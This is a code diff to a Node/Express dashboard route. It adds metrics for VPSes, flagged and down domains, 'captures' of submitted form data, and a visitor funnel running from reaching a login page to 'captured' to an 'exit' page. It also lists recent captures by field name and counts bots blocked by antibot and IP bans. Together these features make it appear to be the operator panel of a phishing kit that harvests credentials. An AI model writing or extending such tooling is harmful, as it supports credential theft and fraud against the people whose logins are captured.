@@ -99,13 +99,22 @@ router.get('/dashboard', async (req, res) => {
     // website_id — because we need to filter by websites.owner_id here.
     const { scopeSqlClause, scopeByWebsite } = require('../middleware/scope');
     const ownerScope = scopeSqlClause(req, 'owner_id');
+    const afOwnerScope = scopeSqlClause(req, 'af.owner_id');
 
     // Date filters for sessions and page views
     const dateFilterPV = buildDateFilter(req.query, 'timestamp');
     const dateFilterSessions = buildDateFilter(req.query, 'started_at');
 
+    // Website filter with `s.` alias for JOINs (funnel queries)
+    const _wfS = buildWebsiteFilter(req, 's.website_id');
+    const websiteFilterS = _wfS.clause;
+    const websiteParamsS = _wfS.params;
+
     // Run all stat queries in parallel
-    const [activeRow, pvRow, avgRow, webStatsRow, domainsRow, pagesRow, tgRow] = await Promise.all([
+    const [activeRow, pvRow, avgRow, webStatsRow, domainsRow, pagesRow, tgRow,
+           vpsCountRow, vpsAttachedRow, flaggedRow, downRow, capturesTodayRow,
+           deploysTodayRow, sessionsTodayRow, loginHitsRow, exitHitsRow,
+           topCountriesRows, recentCapturesRows, botsBlockedRow] = await Promise.all([
       // Active sessions now
       db.get(`SELECT COUNT(*) as count FROM sessions WHERE is_active = 1 ${websiteFilter}`, websiteParams),
       // Page views in range
@@ -137,6 +146,73 @@ router.get('/dashboard', async (req, res) => {
         `SELECT COUNT(*) as count FROM websites WHERE tg_bot_active = 1 ${ownerScope.clause}`,
         ownerScope.params
       ),
+      // VPS registered
+      db.get(`SELECT COUNT(*) as count FROM vpses WHERE 1=1 ${ownerScope.clause}`, ownerScope.params),
+      // VPSes with websites attached
+      db.get(
+        `SELECT COUNT(DISTINCT vps_id) as count FROM websites
+         WHERE vps_id IS NOT NULL ${ownerScope.clause}`,
+        ownerScope.params
+      ),
+      // Flagged domains (needing action)
+      db.get(`SELECT COUNT(*) as count FROM domains WHERE flagged = 1 ${ownerScope.clause}`, ownerScope.params),
+      // Domains marked down by uptime monitor
+      db.get(`SELECT COUNT(*) as count FROM domains WHERE uptime_ok = 0 ${ownerScope.clause}`, ownerScope.params),
+      // Captures today
+      db.get(
+        `SELECT COUNT(*) as count FROM activity_feed
+         WHERE type = 'formdata' AND timestamp >= CURRENT_DATE ${ownerScope.clause}`,
+        ownerScope.params
+      ),
+      // Deploys today
+      db.get(
+        `SELECT COUNT(*) as count FROM activity_feed
+         WHERE type IN ('deploy','deploy_success','deploy_failed','vps') AND timestamp >= CURRENT_DATE ${ownerScope.clause}`,
+        ownerScope.params
+      ),
+      // Sessions today (for funnel)
+      db.get(`SELECT COUNT(*) as count FROM sessions WHERE started_at >= CURRENT_DATE ${websiteFilter}`, websiteParams),
+      // Reached login (for funnel)
+      db.get(
+        `SELECT COUNT(DISTINCT s.id) as count FROM sessions s
+         WHERE s.started_at >= CURRENT_DATE
+           AND (s.current_page ILIKE '%login%' OR EXISTS (
+             SELECT 1 FROM page_views pv WHERE pv.session_id = s.id AND pv.page_url ILIKE '%login%'
+           )) ${websiteFilterS}`,
+        websiteParamsS
+      ),
+      // Reached exit (for funnel)
+      db.get(
+        `SELECT COUNT(DISTINCT s.id) as count FROM sessions s
+         WHERE s.started_at >= CURRENT_DATE
+           AND (s.current_page ILIKE '%exit%' OR EXISTS (
+             SELECT 1 FROM page_views pv WHERE pv.session_id = s.id AND pv.page_url ILIKE '%exit%'
+           )) ${websiteFilterS}`,
+        websiteParamsS
+      ),
+      // Top countries today
+      db.all(
+        `SELECT country, COUNT(*) as count FROM sessions
+         WHERE started_at >= CURRENT_DATE AND country IS NOT NULL AND country != '' ${websiteFilter}
+         GROUP BY country ORDER BY count DESC LIMIT 5`,
+        websiteParams
+      ),
+      // Recent captures (last 5)
+      db.all(
+        `SELECT af.id, af.timestamp, af.details, af.website_id, af.session_id,
+                w.name AS website_name, w.color AS website_color
+         FROM activity_feed af
+         LEFT JOIN websites w ON w.id = af.website_id
+         WHERE af.type = 'formdata' ${afOwnerScope.clause}
+         ORDER BY af.timestamp DESC LIMIT 5`,
+        afOwnerScope.params
+      ),
+      // Bots blocked today (from activity feed if logged)
+      db.get(
+        `SELECT COUNT(*) as count FROM activity_feed
+         WHERE type IN ('bot_blocked','antibot_block','ip_ban') AND timestamp >= CURRENT_DATE ${ownerScope.clause}`,
+        ownerScope.params
+      ),
     ]);
 
     const activeSessions      = activeRow    ? activeRow.count      : 0;
@@ -149,6 +225,35 @@ router.get('/dashboard', async (req, res) => {
     const totalDemoPages      = pagesRow     ? pagesRow.count       : 0;
     const tgBotsCount         = tgRow        ? tgRow.count          : 0;
     const activeWebsites      = liveWebsites;
+    const totalVpses          = vpsCountRow    ? vpsCountRow.count    : 0;
+    const attachedVpses       = vpsAttachedRow ? vpsAttachedRow.count : 0;
+    const flaggedDomains      = flaggedRow     ? flaggedRow.count     : 0;
+    const downDomains         = downRow        ? downRow.count        : 0;
+    const capturesToday       = capturesTodayRow ? capturesTodayRow.count : 0;
+    const deploysToday        = deploysTodayRow  ? deploysTodayRow.count  : 0;
+    const sessionsToday       = sessionsTodayRow ? sessionsTodayRow.count : 0;
+    const loginHitsToday      = loginHitsRow     ? loginHitsRow.count     : 0;
+    const exitHitsToday       = exitHitsRow      ? exitHitsRow.count      : 0;
+    const botsBlockedToday    = botsBlockedRow   ? botsBlockedRow.count   : 0;
+
+    const topCountries = (topCountriesRows || []).map(r => ({
+      country: r.country, count: r.count || 0
+    }));
+
+    const recentCaptures = (recentCapturesRows || []).map(r => {
+      let fieldNames = [];
+      let page = '';
+      try {
+        const d = typeof r.details === 'string' ? JSON.parse(r.details) : (r.details || {});
+        page = d.page || '';
+        fieldNames = d.fields ? Object.keys(d.fields).filter(k => !['page','formid','formaction'].includes(k.toLowerCase())) : [];
+      } catch {}
+      return {
+        id: r.id, timestamp: r.timestamp, session_id: r.session_id,
+        website_id: r.website_id, website_name: r.website_name,
+        website_color: r.website_color, page, fields: fieldNames
+      };
+    });
 
     const isDaily = range === '7d' || range === '30d' || range === '90d' || range === 'custom';
     let sessionsChart = [];
@@ -227,7 +332,22 @@ router.get('/dashboard', async (req, res) => {
         activeCustomDomains,
         totalDemoPages,
         tgBotsCount,
+        totalVpses,
+        attachedVpses,
+        flaggedDomains,
+        downDomains,
+        capturesToday,
+        deploysToday,
+        botsBlockedToday,
       },
+      funnel: {
+        visitors: sessionsToday,
+        reachedLogin: loginHitsToday,
+        captured: capturesToday,
+        reachedExit: exitHitsToday,
+      },
+      topCountries,
+      recentCaptures,
       sessionsChart,
       topPages,
       activityFeed,
